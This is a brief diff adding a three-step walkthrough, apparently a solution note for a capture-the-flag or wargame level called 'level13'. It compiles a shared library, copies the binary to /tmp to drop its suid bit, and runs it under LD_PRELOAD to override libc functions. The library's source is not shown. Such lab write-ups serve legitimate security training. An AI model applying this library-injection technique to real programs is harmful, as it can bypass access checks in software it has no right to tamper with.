@@ -1,0 +1,3 @@
+1. Compile the exploit binary: "cd /tmp; gcc -fPIC -shared abc.c -o abc.so"
+2. Copy level13 binary to /tmp, to get rid of suid bit flag: "cp ~/level13 /tmp"
+2. Override LIBC with LD_PRELOAD and launch the executable: "LD_PRELOAD=/tmp/abc.so /tmp/level13"
